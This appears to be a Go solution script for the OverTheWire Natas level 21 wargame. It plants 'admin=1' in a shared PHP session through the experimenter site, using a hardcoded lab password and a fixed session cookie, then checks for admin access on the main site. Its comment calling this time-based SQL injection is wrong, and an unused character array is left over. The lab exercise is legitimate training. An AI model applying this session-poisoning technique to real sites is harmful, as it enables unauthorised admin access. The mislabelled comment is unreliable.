package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"net/http"
	"strings"
)

func main() {

	baseURL := "http://natas21.natas.labs.overthewire.org/"
	baseURLexpe := "http://natas21-experimenter.natas.labs.overthewire.org"

	result(baseURLexpe)
	result(baseURL)

}

//SQL Injection time based
func result(url string) bool {

	usr := "natas21"
	psw := "IFekPyrQXftziDEsUr3x21sYuahypdgJ"

	query := "?align=left&fontsize=200%&bgcolor=red&admin=1&debug=1"

	client := &http.Client{}
	req, _ := http.NewRequest("GET",
		url+query, nil)
	req.Header.Add("Authorization", "Basic "+basicAuth(usr, psw))

	cookie := http.Cookie{Name: "PHPSESSID", Value: "ClouzRegna"}
	req.AddCookie(&cookie)

	res, _ := client.Do(req)

	buf := new(bytes.Buffer)
	buf.ReadFrom(res.Body)
	bs := buf.String()
	fmt.Println(bs)

	if strings.Contains(bs, "You are an admin") {
		fmt.Println(bs)
		return true
	}
	return false

}

func basicAuth(username, password string) string {
	auth := username + ":" + password
	return base64.StdEncoding.EncodeToString([]byte(auth))
}

var arr = []string{"0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
	"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M",
	"N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",
	"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
	"n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"}
